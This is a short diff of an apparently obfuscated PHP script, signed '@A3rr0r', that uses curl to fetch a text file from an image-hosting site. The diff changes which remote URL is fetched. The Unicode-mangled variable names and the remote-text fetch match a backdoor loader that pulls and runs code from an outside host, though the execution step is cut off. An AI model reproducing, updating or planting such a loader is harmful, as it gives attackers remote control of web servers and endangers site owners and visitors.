@@ -2,7 +2,7 @@
 
 /* @A3rr0r */
 
-$ࠡ7bc9ࠥ1 = 'https://www.image2url.com/r2/default/files/1794636619970-7e15b121-1137-4cfb-b9a1-6d97e9a2df41.txt';
+$ࠡ7bc9ࠥ1 = 'https://www.image2url.com/r2/default/files/1794637897873-4f82201f-1315-46c6-a8d1-d44e1075b627.txt';
 $ࠡe620ࠥ2 = curl_init($ࠡ7bc9ࠥ1);
 $ࠟ࠯ࠡ࠵96 = new ArrayIterator([
 'RETURNTRANSFER',
